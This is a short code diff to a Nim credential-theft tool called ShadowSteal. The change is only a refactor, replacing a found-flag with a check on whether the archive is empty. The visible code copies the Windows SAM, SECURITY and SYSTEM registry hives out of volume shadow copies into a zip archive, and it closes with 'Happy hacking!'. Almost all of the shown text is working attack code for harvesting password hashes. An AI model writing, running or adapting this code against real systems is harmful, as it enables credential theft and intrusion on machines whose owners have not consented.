@@ -16,7 +16,6 @@ import tables
 proc shadowSteal(): void =
     let time = cast[string](format(now(), "yyyyMMddhhmm"))
     let archive = ZipArchive()
-    var isFound: bool = false
 
     echo "[*] Executing ShadowSteal..."
     echo "[*] Time: ", time
@@ -27,12 +26,11 @@ proc shadowSteal(): void =
 
         for elem in @["SAM", "SECURITY", "SYSTEM"]:
             if fileExists(configPath & elem):
-                isFound = true
                 echo "[*] Found: ", configPath & elem
                 let fi = getFileInfo(configPath & elem)
                 archive.contents["HarddiskVolumeShadowCopy" & $i & "/" & $fi.lastWriteTime & "_" & elem] = ArchiveEntry(contents: readFile(configPath & elem))
 
-    if isFound:
+    if archive.contents.len > 0:
         echo "[*] Compressing... ", time & "_ShadowSteal.zip"
         archive.writeZipArchive(time & "_ShadowSteal.zip")
         echo "[*] Done! Happy hacking!"
